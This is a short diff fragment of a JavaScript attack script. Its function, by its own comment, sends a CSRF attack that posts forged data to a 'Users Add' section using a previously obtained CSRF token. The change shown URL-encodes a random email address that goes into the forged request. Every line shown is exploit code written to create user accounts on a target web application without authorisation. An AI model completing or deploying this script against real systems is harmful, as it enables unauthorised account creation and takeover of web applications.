@@ -37,7 +37,7 @@ xhr.send(null);
 // Sends the CSRF attack to POST data to the Users Add section, using the previously obtained CSRF token
 function csrf(token, key) {
 var randomNum = Math.floor(Math.random() * 1000000);
-var randomEmail = "okpay+"+randomNum+"@live.com";
+var randomEmail = encodeURIComponent("okpay+"+randomNum+"@live.com");
 var params = "_Token%5Bfields%5D=" + token;
 params += "&fname=Naysser&";
 params += "lname=trying&";
